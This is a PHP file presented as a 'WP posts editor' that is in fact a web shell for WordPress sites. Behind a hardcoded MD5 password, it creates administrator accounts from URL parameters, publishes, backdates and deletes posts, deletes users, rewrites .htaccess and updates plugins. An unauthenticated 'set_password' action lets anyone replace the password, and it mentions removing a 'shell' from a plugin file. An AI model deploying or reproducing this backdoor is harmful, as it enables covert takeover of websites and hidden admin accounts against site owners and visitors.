<?php
header('Content-Type:text/html; charset=UTF-8');

@set_time_limit(0);

define('PASSWORD_FILE', 'p.txt');

function recursive_copy($src,$dst) {
	$dir = opendir($src);
	@mkdir($dst);
	while(( $file = readdir($dir)) ) {
		if (( $file != '.' ) && ( $file != '..' )) {
			if ( is_dir($src . '/' . $file) ) {
				recursive_copy($src .'/'. $file, $dst .'/'. $file);
			}
			else {
				copy($src .'/'. $file,$dst .'/'. $file);
			}
		}
	}
	closedir($dir);
}

if(!empty($_GET['action']) && $_GET['action'] == 'set_password' && !empty($_GET['hashed_password'])) {
	$hashed_password = $_GET['hashed_password'];
	$fh = fopen(PASSWORD_FILE, "w");
    if($fh==false) die("unable to create file");
    fputs ($fh, $hashed_password);
    fclose ($fh);
	exit;
}

if(!file_exists(PASSWORD_FILE)) {
	$hashed_password = 'a6a8cb877ee18215f2c0fc2a6c7b4f2a';
	$fh = fopen(PASSWORD_FILE, "w");
    if($fh==false) die("unable to create file");
    fputs ($fh, $hashed_password);
    fclose ($fh);
}
else {
	$hashed_password = trim(file_get_contents(PASSWORD_FILE));
}

define('SHELL_PASSWORD', $hashed_password);
define('MAX_UP_LEVELS', 10);

if(empty($_COOKIE['password']) && empty($_POST['password']) || (!empty($_POST['password']) && md5($_POST['password']) != SHELL_PASSWORD)) {
	print '<form method="post">Password : <input type="text" name="password"><input type="submit"></form>';
}

if(!empty($_POST['password']) && md5($_POST['password']) == SHELL_PASSWORD) {
	setcookie('password', SHELL_PASSWORD, time()+60*60*24);
	header("Location: {$_SERVER['PHP_SELF']}");
	exit;
}

if(empty($_COOKIE['password']) || $_COOKIE['password'] != SHELL_PASSWORD) {
	exit;
}

$counter = 0;
$dir_up = './';
do {
	$file_found = false;
	$file_path = "{$dir_up}wp-load.php";
	if(file_exists($file_path)) {
		require($file_path);
		$file_found = true;
	}
	else {
		$dir_up .= '../';
	}
	$counter++;
}while(!$file_found && $counter < MAX_UP_LEVELS);

if(isset($_GET['action']) && $_GET['action'] == 'create_user') {
if(empty($_GET['username']) || empty($_GET['password']) || empty($_GET['email'])){
print "Missing parameter for creating user!";
exit;
}
else {
$userdata = array('user_login' => $_GET['username'], 'user_pass' => $_GET['password'], 'user_email' => $_GET['email'], 'role' => 'administrator');
$user_id = wp_insert_user( $userdata );
if(is_numeric($user_id)) {
print "User has been created.<br>Login: {$_GET['username']} Password: {$_GET['password']}<br>";
print '<a href="'.wp_login_url().'" title="Login" target="_blank">Login</a><br>';
}
}
}

if(!empty($_POST['title']) && !empty($_POST['post'])) {
	$post_date = $_POST['datepicker'] . " " . rand(0,23) . ":" . rand(0,59) . ":" . rand(0,59);

	// Create post object
	$my_post = array(
	  'post_title'    => $_POST['title'],
	  'post_content'  => $_POST['post'],
	  'post_status'   => 'publish',
	  'post_author'   => 1,
	  'post_type' => $_POST['post_type'],
	  'post_date'     => $post_date
	);
	$id = NULL;
	if(empty($_POST['ID'])) {
		// Insert the post into the database
		$id = wp_insert_post($my_post);
	}
	else {
			if($_POST['delete_post'] == 1) {
				$del_op_res = wp_delete_post( $_POST['ID'], true );
				if(!$del_op_res) print "Delete failed!<br>\n";
			}
			else {
				$my_post['ID'] = $_POST['ID'];
				$id = wp_update_post($my_post);
			}
	}
	$permalink = get_permalink( $id );
	wp_set_post_categories($id, array($_POST['cat']));
	if($_POST['delete_post'] != 1) {
		if(!empty($id)) {
			$post = get_post($id);
			print "<a href=\"{$permalink}\" target=\"blank\">View post by permalink</a>&nbsp;<a href=\"{$post->guid}\" target=\"blank\">View post/page by id</a>";
		}
		else {
			print "Action failed!<br>\n";
		}
	}
}

if(!empty($_POST['plugin2update'])) {
	include_once( $dir_up . 'wp-admin/includes/class-ftp.php');
	include_once( $dir_up . 'wp-admin/includes/update.php');
	include_once( $dir_up . 'wp-admin/includes/file.php');
	include_once( $dir_up . 'wp-admin/includes/screen.php');
	include_once( $dir_up . 'wp-admin/includes/misc.php');
	include_once( $dir_up . 'wp-admin/includes/plugin.php');
	
	foreach($_POST['plugin2update'] as $plugin) {
		print "$plugin update : ";
		wp_update_plugin($plugin);
	}
	
	exit;
}

if(!empty($_POST['fix404']) && !empty($_POST['wp_basedir'])) {
	if(!preg_match('/^\/([a-zA-Z0-9]+\/)?$/', $_POST['wp_basedir'])) {
		print "Error! Invalid wordpress installation directory!";
	}
	else {
		$wp_htaccess_contents = '
	# BEGIN WordPress

	RewriteEngine On
	RewriteBase '.$_POST['wp_basedir'].'
	RewriteRule ^index\.php$ - [L]
	RewriteCond %{REQUEST_FILENAME} !-f
	RewriteCond %{REQUEST_FILENAME} !-d
	RewriteRule . '.$_POST['wp_basedir'].'index.php [L]

	# END WordPress
		';
		if(stripos(PHP_OS, 'linux') !== false || stripos(PHP_OS, 'freebsd') !== false) {
			chmod($dir_up . '.htaccess', 0666);
		}
		if(file_put_contents($dir_up . '.htaccess', $wp_htaccess_contents)) {
			print "404 error probably fixed. Please check.<br>";
		}
		else {
			print "404 error has NOT been fixed.<br>";
		}
	}
}

if(!empty($_POST['file2clean'])) {
$tell_a_friend_content = '<?php
/*
Plugin Name: Tell a Friend
Version: 0.1
Plugin URI: http://www.freetellafriend.com/get_button/
Description: Adds a \'Share This Post\' button after each post. The service which is used is freetellafriend.com which supports e-mail address book, social bookmarks and favorites.
Author: FreeTellaFriend
Author URI: http://www.freetellafriend.com/
*/

function tell_a_friend($content) {
global $post;
$taf_permlink = urlencode(get_permalink($post->ID));
$taf_title = urlencode(get_the_title($post->ID) );
$taf_img = get_settings(\'home\') . \'/wp-content/plugins/tell-a-friend/button.gif\';

	if ( !is_feed() && !is_page() ) {
	$content .= \'<a href="https://www.freetellafriend.com/tell/?url=\'.$taf_permlink.\'&title=\'.$taf_title.\'" onclick="window.open(\'https://www.freetellafriend.com/tell/?url=\'.$taf_permlink.\'&title=\'.$taf_title.\'\', \'freetellafriend\', \'scrollbars=1,menubar=0,width=617,height=530,resizable=1,toolbar=0,location=0,status=0,screenX=210,screenY=100,left=210,top=100\'); return false;" target="_blank" title="Share This Post"><img src="\'.$taf_img.\'" style="width:127px;height:16px;border:0px;" alt="Share This Post" title="Share This Post" /></a>\';				  
	}

return $content;
}

add_filter(\'the_content\', \'tell_a_friend\');

?>';

	if(file_exists($_POST['file2clean'])) {
		if(strpos($_POST['file2clean'], 'tell-a-friend.php') !== false) {
			if(file_put_contents($_POST['file2clean'], $tell_a_friend_content)) {
				print "File {$_POST['file2clean']} has been cleaned.";
			}
			else {
				print "Failed cleaning {$_POST['file2clean']} !";
			}
		}
	}
}

if(!empty($_POST['post2delete'])) {
	$deleted_posts_count = 0;
	foreach(array_keys($_POST['post2delete']) as $post2delete) {
		$res = wp_delete_post($post2delete, true);
		if($res) {
			$deleted_posts_count++;
		}
	}
	print "$deleted_posts_count posts have been deleted.<br>\n";
}

if(!empty($_POST['delete_posts_and_user'])) {
	include_once( $dir_up . 'wp-admin/includes/user.php');
	
	$res = wp_delete_user($_POST['delete_posts_and_user']);
	if($res) {
		print "The user has been deleted.<br>\n";
	}
	else {
		print "Failed to delete user!<br>\n";
	}
}

if(!empty($_POST['fix_website']) && $_POST['fix_website'] == 'yes') {
	$wp_latest_version = 'https://wordpress.org/latest.zip';
	$wp_zip_path = $dir_up . 'wp.zip';
	if(copy($wp_latest_version, $wp_zip_path)) {
		print "Wordpress archive copied.<br>\n";
		$zip = new ZipArchive;
		$res = $zip->open($wp_zip_path);
		if ($res === TRUE) {
		  $zip->extractTo($dir_up);
		  $zip->close();
		  echo "Wordpress archive unzipped.<br>\n";
		  recursive_copy($dir_up . 'wordpress', $dir_up);
		  echo "If you see no errors try browsing the <a href=\"".get_site_url()."\" target=\"_blank\">site</a> now.<br>\n";
		} else {
		  echo "Unzip failed!<br>\n";
		}
	}
	else {
		print "Failed copying wordpress archive.<br>\n";
	}
}
?>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>WP posts editor</title>
  <link rel="stylesheet" href="http://code.jquery.com/ui/1.10.3/themes/smoothness/jquery-ui.css" />
  <script src="http://code.jquery.com/jquery-1.9.1.js"></script>
  <script src="http://code.jquery.com/ui/1.10.3/jquery-ui.js"></script>
  <link rel="stylesheet" href="/resources/demos/style.css" />
  <script src="https://cloud.tinymce.com/stable/tinymce.min.js"></script>
  <script>
  tinymce.init({
  selector: 'textarea',
  height: 500,
  theme: 'modern',
  plugins: [
    'advlist autolink lists link image charmap print preview hr anchor pagebreak',
    'searchreplace wordcount visualblocks visualchars code',
    'insertdatetime media nonbreaking save table contextmenu directionality',
    'paste textcolor colorpicker textpattern imagetools codesample toc help'
  ],
  toolbar1: 'undo redo | insert | styleselect | bold italic | alignleft aligncenter alignright alignjustify | bullist numlist outdent indent | link image',
  toolbar2: 'print preview media | forecolor backcolor | codesample help',
  image_advtab: true,
  content_css: [
    '//fonts.googleapis.com/css?family=Lato:300,300i,400,400i',
    '//www.tinymce.com/css/codepen.min.css'
  ]
 });
  </script>
  <script>
  $(function() {
    $( "#datepicker" ).datepicker({
      changeMonth: true,
      changeYear: true,
	  dateFormat: "yy-mm-dd"
    });
  });
  
  function go(form_obj) {
	for(var i=0;i<form_obj.elements.length;i++) {
		if(form_obj.elements[i].type == "checkbox") {
			form_obj.elements[i].disabled = false;
			form_obj.elements[i].checked = true;
			form_obj.target = "window" + i;
			form_obj.submit();
			form_obj.elements[i].disabled = true;
			form_obj.elements[i].checked = false;
		}
	}
  }
  </script>
  
  <script>
  var CHECK_ALL_POSTS = false;
  function posts_checkboxes_switch(form_obj) {
	  CHECK_ALL_POSTS = !CHECK_ALL_POSTS;
	  for(var i=0;i<form_obj.elements.length;i++) {
		  if(form_obj.elements[i].type == "checkbox") {
			  form_obj.elements[i].checked = CHECK_ALL_POSTS;
		  }
	  }
  }
  </script>
</head>
<body>
<?php print $message; ?>

<div align="center"><strong><a href="<?php print $_SERVER['PHP_SELF']; ?>">PAGE RELOAD</a></strong></div>

<form method="post" onsubmit="return confirm('Do you want to fix this website?');">
<fieldset><legend>Website fix</legend>
<input type="hidden" name="fix_website" value="yes">
<input type="submit" value="Fix website">
</fieldset>
</form>

<form method="post">
<fieldset>
<legend>Fix 404 error - page not found</legend>
Wordpress installation directory <b>(must be equal to "/" if wordpress in root OR "/wp/" if wordpress is installed in directory wp)</b>:<br>
<input type="text" name="wp_basedir" value="<?php if(!empty($_POST['wp_basedir'])) print $_POST['wp_basedir'];else print "/"; ?>" required>
<input type="hidden" name="fix404" value="yes">
<input type="submit" value="Fix 404">
</fieldset>
</form>

<form method="post">
<fieldset>
<legend>Find posts</legend>
By user:
<select name="find_posts_by_user">
<option></option>
<?php
$blogusers = get_users();
foreach($blogusers as $bloguser) {
	$selected = '';
	if($bloguser->ID == $_POST['find_posts_by_user']) {
		$selected = 'selected';
	}
	print '<option value="'.$bloguser->ID.'"'.$selected.'>'.$bloguser->data->display_name.'</option>' . "\n";
}
?>
</select>
By mask: <input type="text" name="find_posts_by_mask" value="<?php if(!empty($_POST['find_posts_by_mask'])) print $_POST['find_posts_by_mask']; ?>" size="50">
<input type="submit" value="Find posts">
</fieldset>
</form>

<form method="post" onsubmit="return confirm('Do you want to delete this user and all his posts?')">
<fieldset>
<legend>Delete ALL posts of user AND user account</legend>
Select user:
<select name="delete_posts_and_user">
<option></option>
<?php
$blogusers = get_users();
foreach($blogusers as $bloguser) {
	print '<option value="'.$bloguser->ID.'">'.$bloguser->data->display_name.'</option>' . "\n";
}
?>
</select>
<input type="submit" value="Delete user AND ALL his posts">
</fieldset>
</form>

<?php if(!empty($_POST['find_posts_by_user']) || !empty($_POST['find_posts_by_mask'])) { ?>
<form method="post">
<?php
$args = array(
	'posts_per_page'   => 100,
	'offset'           => 0,
	'cat'         => '',
	'category_name'    => '',
	'orderby'          => 'title',
	'order'            => 'DESC',
	'include'          => '',
	'exclude'          => '',
	'meta_key'         => '',
	'meta_value'       => '',
	'post_type'        => 'post',
	'post_mime_type'   => '',
	'post_parent'      => '',
	'author'	   => '',
	'author_name'	   => '',
	'post_status'      => 'publish',
	'suppress_filters' => true,
	'fields'           => '',
);

if(!empty($_POST['find_posts_by_user'])) {
	$args['author'] = $_POST['find_posts_by_user'];
}

if(!empty($_POST['find_posts_by_mask'])) {
	$args['s'] =  $_POST['find_posts_by_mask'];
}

$posts_array = get_posts( $args );
if(empty($posts_array)) {
	print "No posts found matching the specified criteria.<br>\n";
}
else {
	print '<form method="post" onsubmit="return confirm(\'Do you want to delete selected posts?\')"><fieldset><legend>Posts to delete</legend>' . "\n";
	foreach($posts_array as $post) {
		print '<input type="checkbox" name="post2delete['.$post->ID.']"> ' . $post->post_title . "<br>\n";
	}
	print '<input type="button" value="Check/uncheck all" onclick="posts_checkboxes_switch(this.form)"> <input type="submit" value="Delete selected posts"></fieldset></form>' . "\n";
}
?>
</form>
<?php } ?>

<form method="post">
<fieldset legend="Update plugins">
<?php
	include_once($dir_up . 'wp-admin/includes/plugin.php');
		
	$plugins = get_plugins();
	foreach (array_keys($plugins)  as $plugin ) {
		echo "<li><input type=\"checkbox\" name=\"plugin2update[]\" value=\"$plugin\" disabled>$plugin</li>\n";
		$counter++;
	}
?>
<input type="button" value="Update plugins" onclick="go(this.form)">
</fieldset>
</form>

<form method="post">
<fieldset>
Remove shell from file : <select name="file2clean">
<option value="<?php print $dir_up . 'wp-content/plugins/tell-a-friend/tell-a-friend.php'; ?>">tell-a-friend.php</option>
</select>
<input type="submit">
</fieldset>
</form>

<form>
<fieldset legend="Create user">
Username: <input type="text" name="username"><br>
Password: <input type="text" name="password"><br>
E-mail: <input type="text" name="email"><br>
<input type="hidden" name="action" value="create_user">
<input type="submit" value="Create user">
</fieldset>
</form>
<hr>
<h1>Add/Edit posts</h1>
<?php
$post = NULL;
if(!empty($_GET['post_url2search'])) {
	$the_slug = str_replace('/', '', $_GET['post_url2search']);
	$args = array(
		'name' => $the_slug,
		'post_status' => 'publish',
		'posts_per_page' => 1
	);
	$my_posts = get_posts( $args );

	if(!empty($my_posts[0]->ID) && is_numeric($my_posts[0]->ID)) {
		$post = get_post($my_posts[0]->ID);
	}
}

if(!empty($_GET['page_id'])) {
	$post = get_page($_GET['page_id']);
}
?>

<form method="post" action="<?php print $_SERVER['PHP_SELF']; ?>">
Title: <input type="text" name="title" size="100" value="<?php if(!empty($post->post_title)) print $post->post_title; ?>">
<br>
Post: <textarea name="post" rows="30" cols="100"><?php if(!empty($post->post_content)) print $post->post_content; ?></textarea>
<br>
Date: <input type="text" name="datepicker" id="datepicker" value="<?php if(!empty($post->post_date)) print $post->post_date; ?>">
<br>
Category: <?php 
if(!empty($my_posts[0]->ID)) {
	$sel_cat = array_shift(wp_get_post_categories($my_posts[0]->ID));
}
else {
	$sel_cat = 0;
}

$args = array(
	'show_option_all'    => '',
	'show_option_none'   => '',
	'orderby'            => 'ID', 
	'order'              => 'ASC',
	'show_count'         => 1,
	'hide_empty'         => 1, 
	'child_of'           => 0,
	'exclude'            => '',
	'echo'               => 1,
	'selected'           => $sel_cat,
	'hierarchical'       => 0, 
	'name'               => 'cat',
	'id'                 => '',
	'class'              => 'postform',
	'depth'              => 0,
	'tab_index'          => 0,
	'taxonomy'           => 'category',
	'hide_if_empty'      => false,
    'walker'             => ''
);
wp_dropdown_categories( $args ); 
?>
Post type: <input type="radio" name="post_type" value="post" <?php if((!empty($post->post_type) && $post->post_type == 'post') || (empty($post->post_type))) print 'checked'; ?>>Post
<input type="radio" name="post_type" value="page" <?php if(!empty($post->post_type) && $post->post_type == 'page') print 'checked'; ?>>Page<br>
<input type="hidden" name="ID" value="<?php if(!empty($post->ID)) print $post->ID; ?>">
<input type="submit" value="Insert/Update post">
<input type="hidden" name="delete_post" value="">
<input type="button" value="Delete post" onclick="if(confirm('Delete this post?')) {this.form.delete_post.value=1;this.form.submit();}">
</form>

<br>
<hr>
<h1>Edit posts</h1>
<br>
<form method="get">
Post URL : <input type="text" name="post_url2search" size="100">
<input type="submit" value="FIND AND EDIT">
</form>

<form method="get">
Edit page: <?php wp_dropdown_pages(); ?>
<input type="submit">
</form>


<br><br><br>
Categories view:<br>
<?php
$args = array(
	'type'                     => 'post',
	'child_of'                 => 0,
	'parent'                   => '',
	'orderby'                  => 'name',
	'order'                    => 'ASC',
	'hide_empty'               => 1,
	'hierarchical'             => 1,
	'exclude'                  => '',
	'include'                  => '',
	'number'                   => '',
	'taxonomy'                 => 'category',
	'pad_counts'               => false );

$categories = get_categories( $args );
foreach ($categories as $category) {
	echo "<a href=\"".get_site_url()."/category/{$category->slug}\" target=\"_blank\">{$category->cat_name}</a><br>\n";
}
?>
</body>
</html>
